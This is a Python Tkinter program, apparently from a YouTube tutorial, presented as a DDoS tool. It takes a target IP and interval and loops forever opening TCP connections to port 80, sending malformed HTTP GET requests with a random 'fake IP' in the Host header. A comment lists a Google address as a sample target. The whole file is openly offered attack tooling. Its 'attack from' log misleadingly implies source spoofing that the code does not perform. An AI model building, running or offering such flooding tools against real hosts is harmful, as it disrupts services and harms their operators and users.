import requests
from tkinter import *
import tkinter
from threading import Thread
from threading import *
import random
import threading
import socket
from time import sleep


#google = 142.250.187.164
attack_num = 0

def start():


    def attack():
        target = E1.get()
        port = 80
        seconds = sn.get()
        while True:

            ip = "{}.{}.{}.{}".format(*__import__("random").sample(range(0,255),4))
            fake_ip = ip

            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((str(target),port))
            s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"),(target,port))
            s.sendto(("Host:" + fake_ip + "\r\n\r\n").encode("ascii"),(target,port))

            global attack_num
            attack_num += 1
            sleep(int(seconds))
         
            panel.tag_configure("style",foreground="green",font=("Arial",12,"bold"))
       
            bilgi = "attack from = {}   /packet:{}   to : {} \n ".format(ip,attack_num,target)
            panel.insert(END,bilgi,"style")


            s.close()


    for i in range(1):
        thread = threading.Thread(target=attack)
        thread.start()



master = Tk()
master.geometry("800x600+200+50")
master.title("DDOS")
master.resizable(False,False)
tk_logo = PhotoImage(file="logo/tklogo.png")
master.iconphoto(False,tk_logo)

#-----------------------------------------#
#-----------------------------------------#
frame1 = Frame(master,bg="white")
frame1.place(relx=0,rely=0,relwidth=1.0,relheight=0.2)
logo = PhotoImage(file="logo/logo.png")
Label(frame1,bg="white",image=logo).pack()

#------------------------------------------#
#------------------------------------------#

frame2 = Frame(master,bg="darkred")
frame2.place(relx=0,rely=0.2,relwidth=1.0,relheight=0.1)

Label(frame2,text="TARGET IP: ",bg="darkred",fg="white",font="Arial 12 bold").pack(side=LEFT)
E1 = Entry(frame2,bd=1,relief=SOLID)
E1.pack(side=LEFT,padx=5)

Label(frame2,text="SECONDS SELECT: ",bg="darkred",fg="white",font="Arial 12 bold").pack(side=LEFT,padx=10)
sn = Spinbox(frame2,from_=0,to=5,width=15)
sn.pack(side=LEFT,padx=5)


btn_pic = PhotoImage(file="logo/start.png")
start_btn = Button(frame2,image=btn_pic,relief=FLAT,bg="darkred",activebackground="darkred",command=start)
start_btn.pack(side=LEFT,padx=55)

#---------------------
def stop():
    master.destroy()

btn_pic2 = PhotoImage(file="logo/stop.png")
stop_btn = Button(frame2,image=btn_pic2,relief=FLAT,bg="darkred",activebackground="darkred",command=stop)
stop_btn.pack(side=LEFT)


#------------------------------------------#
#------------------------------------------#

frame3 = Frame(master,bg="darkred")
frame3.place(relx=0,rely=0.3,relwidth=1.0,relheight=0.6)

panel = Text(frame3,width=95,height=22,bg="#333")
panel.tag_configure("style",foreground="#d1d1d1",font=("Arial",10,"bold"))
panel.pack()

bilgi = ">>>Burada Sonuclar Görünür...>>>\n"
panel.insert(END,bilgi,"style")

#------------------------------------------#
#------------------------------------------#

frame4 = Frame(master,bg="darkred")
frame4.place(relx=0,rely=0.9,relwidth=1.0,relheight=0.1)
Label(frame4,text="OlcaySoftware Youtube -©ddos 2021",bg="darkred",fg="#d1d1d1").pack()

resim1 = PhotoImage(file="logo/fc.png")
resim2 = PhotoImage(file="logo/ins.png")
resim3 = PhotoImage(file="logo/tw.png")
resim4 = PhotoImage(file="logo/dis.png")

Label(frame4,bg="darkred").pack(side=LEFT,padx=120)
Label(frame4,image=resim1,bg="darkred").pack(side=LEFT,padx=20)
Label(frame4,image=resim2,bg="darkred").pack(side=LEFT,padx=20)
Label(frame4,image=resim3,bg="darkred").pack(side=LEFT,padx=20)
Label(frame4,image=resim4,bg="darkred").pack(side=LEFT,padx=20)







master.mainloop()


